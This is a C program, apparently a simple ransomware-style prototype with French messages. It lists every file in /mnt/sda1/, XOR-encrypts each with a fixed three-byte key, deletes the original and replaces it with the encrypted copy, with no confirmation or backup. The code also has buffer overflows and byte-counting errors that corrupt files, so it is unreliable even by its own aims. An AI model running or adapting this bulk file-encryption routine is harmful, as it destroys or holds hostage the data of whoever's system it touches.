#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>

void encryptDecrypt(char *input, char *output) {
	char key[] = {'K', 'C', 'Q'}; //Can be any chars, and any size array

	int i;
	for(i = 0; i < strlen(input); i++) {
		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];

	}
}


void encryptFile(char* input,char* output){

	// Creation of the files
	FILE *FileIn;
	FILE *FileOut;

	// initialization
	char *lineIn = NULL;
	char fileIn[1024];
	strcpy(fileIn,"");
	size_t len = 0;
	size_t lentot=0;
	ssize_t read;

	// open file input and output
	FileIn = fopen(input,"r+");
	if(FileIn == NULL)
	{	
		fprintf(stderr,"problème pour le fichier d'entrée");
        	exit(EXIT_FAILURE);
	} 
	FileOut = fopen(output,"w+");
	if(FileOut == NULL)
	{
		fprintf(stderr,"problème pour le fichier de sortie");
        	exit(EXIT_FAILURE);
	} 

	// read each line of the input and store it in fileIn
	while ((read = getline(&lineIn, &len, FileIn)) != -1 && lentot<1025) 
	{
		strcat(fileIn,lineIn);
		lentot+=sizeof(lineIn);
	}
	
	char txtOut[strlen(fileIn)];
	encryptDecrypt(fileIn, txtOut);
	fwrite (txtOut , sizeof(char), sizeof(txtOut), FileOut);

	fclose(FileIn);
	fclose(FileOut);

	if (lineIn)
	{
		free(lineIn);
	}



}


int main()
{
	struct dirent *lecture;
	DIR *rep;
	char* nomDos = "/mnt/sda1/";
	printf("je me place dans le dossier /mnt/sda1/");
	rep = opendir(nomDos);
	int i=0;
	int ret;
	char *tabFile[1024];
	while ((lecture = readdir(rep))) 
	{
		char* nom = lecture->d_name;
		printf("%s\n", lecture->d_name);   
		if(strcmp(lecture->d_name,".")!=0 && strcmp(lecture->d_name,"..")!=0){
		tabFile[i] = malloc (strlen (nom) + 1);
		strcpy (tabFile[i], nom);
		i++;
		}
	}
	int comp = 0;

	printf("\n\n\n");  	
	while (comp<i) 
	{
			char* nom2 = malloc (2048);
			strcpy(nom2,nomDos);
			strcat(nom2,tabFile[comp]);
			printf("%s\n", nom2);
			char* tmp="tmp.txt";
			encryptFile(nom2,tmp);
	   		ret = remove(nom2);
	   		ret = rename(tmp, nom2);
			printf("%s traite\n", nom2);
		comp++;
	}

	closedir(rep);
}
